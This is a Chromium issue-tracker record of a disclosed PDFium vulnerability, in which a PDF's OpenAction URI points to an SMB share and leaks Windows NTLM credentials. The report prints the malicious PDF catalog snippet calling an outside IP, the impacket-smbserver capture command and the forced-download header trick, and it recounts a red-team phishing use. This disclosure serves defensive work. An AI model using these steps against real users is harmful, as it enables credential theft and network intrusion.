# Security: SMB credentials leak through PDFium

| Field | Value |
|-------|-------|
| **Issue ID** | [40090719](https://issues.chromium.org/issues/40090719) |
| **Status** | Accepted |
| **Severity** | S1-High |
| **Priority** | P3 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Windows |
| **Reporter** | ta...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2018-03-07 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The Chrome PDF processor is prone to SMB credentials leak when the PDF have a redirection to a shared resource in a Windows environment.

**VERSION**  

Chrome Version: Version 65.0.3325.146 (Official Build) (64-bit)  

Operating System:  

OS Name: Microsoft Windows 10 Pro N  

OS Version: 10.0.16299 N/A Build 16299

**REPRODUCTION CASE**  

The Chrome PDF processor is prone to SMB attack when the PDF have a redirection to a shared resource in a Windows environment.  

The redirection is triggered through an OpenAction with URI pointing to a shared file. This will look as the following content within the PDF.

<<  

/Pages 2 0 R  

/OpenAction <<  

/URI (file://192.168.138.128/TMP/\_blank.htm)  

/IsMap false  

/S /URI  

>>  

/Type /Catalog

A blank PDF can be generated with the attached script "poc.rb".

This leak can only be leveraged from a local file. However, the server can force the PDF to download deceiving the user.  

This is done by adding the header:

Content-Disposition: attachment; filename=poc.pdf;

To serve the shared file and receive the credentials the tool impacket-smbserver can be used:

impacket-smbserver TMP ./

To make the deception more efficient the served file can be an html as the attached "\_blank.htm" with a redirection to the same file on the server but disabling the forced download and thus rendering the PDF file without redirection.

The script to force the download on the first request and not doing it on the following ones can be done as in the attached python PoC "force\_download\_poc.py":

Mitigation:  

As stated in PDFium source (pdfium/public/fpdf\_formfill.h) the Implementation is not requiered nor used on other browsers:

\* Method: FFI\_DoURIAction  

\* This action resolves to a uniform resource identifier.  

\* Interface Version:  

\* 1  

\* Implementation Required:  

\* No

To change the behaviour the source code in (pdfium/fpdfsdk/fsdk\_actionhandler.cpp) the function CPDFSDK\_ActionHandler::DoAction\_URI should be disabled.

## Attachments

- [poc.rb](attachments/poc.rb) (text/plain, 257 B)
- [poc.pdf](attachments/poc.pdf) (application/pdf, 592 B)
- [_blank.htm](attachments/_blank.htm) (text/plain, 81 B)
- [force_download_poc.py](attachments/force_download_poc.py) (text/plain, 1.2 KB)
- [fsdk_actionhandler_patched.cpp](attachments/fsdk_actionhandler_patched.cpp) (text/plain, 17.1 KB)
- [poc_2.mp4](attachments/poc_2.mp4) (video/mp4, 758.8 KB)

## Timeline

### el...@chromium.org (2018-03-08)

I'm not convinced that there's anything special about PDF here. If you download a HTML file instead, I would expect the same behavior with regard to SMB hashes. 

[Monorail components: Internals>Plugins>PDF]

### ta...@gmail.com (2018-03-08)

This is due to the fact that a forced download for PDF is common (I get to read multiple PDF files everyday), no warning is displayed and seem innocuous.

I feel it's dangerous as it's a common behaviour in the everyday web surfing with Chrome. (Note that Firefox and Edge don't show this vulnerability)

Here is a video PoC to check the way it's used.

### ds...@chromium.org (2018-03-08)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-03-09)

Tentatively assigning low severity, but feel free to edit if you disagree.

### sh...@chromium.org (2018-03-10)

[Empty comment from Monorail migration]

### ta...@gmail.com (2018-03-12)

The issue have been successfully used on a red team exercise (With full permission from our client):

The PDF was sent as a CV to apply for a job within the corporation. Once the PDF was opened, internal domain credentials was recovered. The same credentials were used to access the internal network through the VPN. 

This may help to clarify the criticity of the issue.

Regards, 

### el...@chromium.org (2018-03-16)

Now filed against downloaded HTML in https://crbug.com/chromium/822754.

### ta...@gmail.com (2018-03-20)

Any news?

### ds...@chromium.org (2018-03-26)

tsepez@ what's your opinion on this?

### ts...@chromium.org (2018-03-26)

I'm always in favor of disabling dubious functionality, but it should happen at the pdfium_engine level. 

Let's histogram  
https://cs.chromium.org/chromium/src/pdf/pdfium/pdfium_engine.cc?rcl=a5dfe3d896f59f570a4f8ddb60941eeaea93f698&l=4250 maybe.

Alternatively, we could probably drop redirects to file:// URLs entirely in that code.



### ts...@chromium.org (2018-03-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-05-01)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-05-01)

https://securify.nl/en/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html provides a nice summary of this issue more generally.

### mb...@chromium.org (2018-05-01)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-05-03)

+asanka, who's looking at https://crbug.com/chromium/822754. 

### ta...@gmail.com (2018-05-14)

Hi everyone,

Any updates? Is this going to be treated within the Chrome bug bounty program?

I would appreciate further info to prepare a disclosure in our security blog.

Thank you.

### ta...@gmail.com (2018-05-28)

ping ?

### aw...@google.com (2018-05-29)

Hello taouirsa@, pardon the delay for getting back to you. This report will indeed be considered for the Chrome VRP once it has been marked as fixed, and will be assigned a CVE once the fix goes to Stable.

dsinclair@, asanka@ - what's the current state of play?

### ds...@chromium.org (2018-05-29)

We're working on other issues with higher priority at the moment. We will get back to this once we've got some time to take a look.

### as...@chromium.org (2018-05-29)

Re: Links to external resources in saved web pages or HTML loaded via file://...

The most promising approach so far is to prevent local file origins (host portion of file:// URL is either empty or "localhost") from accessing or navigating to remote origins. This is something that'll be web-visible and will take a few releases to gather enough data to fix without causing breakage.

This approach only addresses inadvertent access of resources over SMB while resolving file:// URLs. As https://crbug.com/chromium/819703#c13 in https://crbug.com/chromium/822754 [1] states, this doesn't address the general issue of credentials leakage via SMB. In addition any OS level mediation that limits the use of NTLM authentication would neutralize Chrome specific mediations[2].

I haven't started collecting data around how often file:// URL resolutions cross the local/remote boundary.

[1]: https://bugs.chromium.org/p/chromium/issues/detail?id=822754#c13
[2]: OS level mitigations will have the same compatibility risks for Chrome as Chrome-specific mitigations.


### ta...@gmail.com (2018-08-07)

Any news?

### ds...@chromium.org (2018-09-04)

Setting PDF bugs assigned to me back to untriaged so they can get re-assigned as needed.

### hn...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-04-30)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-04-30)

[Empty comment from Monorail migration]

### ta...@gmail.com (2019-05-26)

[Comment Deleted]

### ta...@gmail.com (2019-05-28)

Tried it on the latest version but it seems it has been patched silently. 
Can you confirm?

### th...@chromium.org (2019-05-28)

Possibly  https://pdfium-review.googlesource.com/c/pdfium/+/42731 or https://pdfium-review.googlesource.com/c/pdfium/+/50770 fixed this?

### ta...@gmail.com (2019-05-28)

https://pdfium-review.googlesource.com/c/pdfium/+/42731/ may have corrected the issue. 
However the related issue was different. In this case it's a misuse of the redirect to leak user's credentials.

Is it then still eligible for reward? 
Regards,

### ts...@chromium.org (2019-08-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-11)

[Empty comment from Monorail migration]

### zh...@google.com (2021-03-17)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-15)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-05)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-31)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-10)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-11)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-11)

This issue was migrated from crbug.com/chromium/819703?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

### sp...@google.com (2025-04-03)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of lower impact user information disclosure 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-04-03)

Hello! We are going through some of our oldest issues tracked as security bugs. We're unsure when we'll come to a resolution on this one, but given the low potential for user harm from this issue and the time since it has been reported, we feel it's reasonable to open this up despite not being resolved. We've earmarked this one for public disclosure on 9 April 2025.

Thank you for your past efforts in discovering and reporting this issue to us. And thank for your patience while this remains in our backlog.

### ta...@gmail.com (2025-04-05)

Thanks for the reply. 
It has been quite some time and almost forgot about this issue. xD
I'll be waiting for p2p-crp to reach out.

Correct me if I'm wrong, the issue is marked for public disclosure on the 9 April 2025,  which means it will not get any disclosure restriction past that date. Right?

Regards.

### pe...@google.com (2025-04-09)

The NextAction date has arrived: 2025-04-09
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### am...@chromium.org (2025-04-10)

re c#102, hi, yes that is correct. This issue is now publicly disclosed, so it is no longer restricted.

## Bounty Award

> report of lower impact user information disclosure

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090719)*
